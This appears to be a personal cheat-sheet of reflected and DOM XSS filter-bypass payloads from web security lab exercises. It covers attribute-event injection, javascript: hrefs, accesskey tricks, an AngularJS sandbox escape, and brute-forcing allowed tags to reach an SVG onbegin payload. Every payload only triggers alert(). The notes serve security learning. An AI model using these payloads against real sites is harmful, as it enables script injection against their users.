* double quotes escaped:
  * [[Reflected DOM XSS |adding a \ to escape the added \]]
* angle brackets encoded:
	* a payload without angle brackets 
		* `/?search="onmouseover="alert(1)` [[XSS_examples#angle brackets encoded| detail]]
		* `<a id="author" href="javascript:alert(1)">test</a>`
		* `onclick"alert(1)"`
	* canonical link or access keys
		* `<link rel="canonical" href='https://0aba0085031513cc809f1c7200380018.web-security-academy.net/'>` [[XSS_examples#Reflected XSS in canonical link tag|detail]]
		* `/?' accesskey='Alt+x' onclick='alert()`
* angle brackets  and double quotes encoded
  * [[XSS_examples#AngularJS expression with angle brackets and double quotes HTML-encoded|exploiting $eval.constructor]]
* event handlers and `href` attributes blocked:
	* bf for available tags and events

* most tags and attributes blocked:
	
  - bf allowed tags and attributes 400 vs 200: [[XSS_examples#Reflected XSS into HTML context with most tags and attributes blocked| `GET /?search=<body%20$=1> HTTP/2`]]
  * bf tags: `?search=<$$>` => `SVG`
  * then bf for events: `?search=<SVG><animateTransform%20$$=1>` => `onbegin`
  * then: `<svg><animateTransform onbegin="alert()"></animateTransform></svg>` [[XSS_examples#Reflected XSS with some SVG markup allowe| detail]]
